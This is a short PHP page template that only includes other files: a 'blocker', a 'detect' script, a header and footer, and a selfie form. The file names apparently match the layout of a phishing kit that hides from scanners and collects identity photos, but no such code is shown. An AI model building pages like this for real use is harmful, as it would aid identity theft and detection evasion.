<?php include('../blocker.php');?>
<?php include('header.php'); ?>
<?php include('../detect.php'); ?>
<?php include('./form/selfie.php'); ?>
<?php include('footer.php'); ?>